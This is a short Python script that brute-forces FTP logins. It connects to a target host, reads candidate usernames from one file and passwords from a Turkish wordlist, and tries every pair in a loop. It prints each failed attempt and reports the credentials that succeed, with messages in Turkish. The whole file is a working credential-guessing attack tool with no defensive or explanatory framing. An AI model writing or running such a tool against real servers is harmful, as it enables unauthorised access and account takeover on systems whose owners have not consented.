import ftplib
import time

ftp = ftplib.FTP()
ftp.set_debuglevel(2)
try:
    ftp.connect("-")
except ftplib.all_errors as e:
    print('FTP error:', e)
    print("ftp açık olmayabilir")

count = 0
count2 = 0
login = False

with open('usernames.txt', 'r', encoding='utf-8', errors='ignore') as usernames:
    while True:
        if login:
            break

        username_line = usernames.readline()

        if not username_line:
            break
        
        count += 1
        #print("Username{}: {}".format(count, username_line.strip()))
        with open('trwordlist.txt', 'r', encoding='utf-8', errors='ignore') as password:
            while True:
                count2 += 1
                password_line = password.readline()
        
                if not password_line:
                    time.sleep(1)
                    count2 = 0
                    break

                # time.sleep(3)
                try:
                    ftp.login(username_line.strip(), password_line.strip())
                    login = True
                    ftp.quit()
                    print("Giriş başarılı\nUsername:{}\nPassword:{}".format(username_line.strip(), password_line.strip()))
                    break
                except ftplib.all_errors as e:
                    print('FTP error:', e)
                    print("Giriş başarısız\nUsername:{}\nPassword:{}".format(username_line.strip(), password_line.strip()))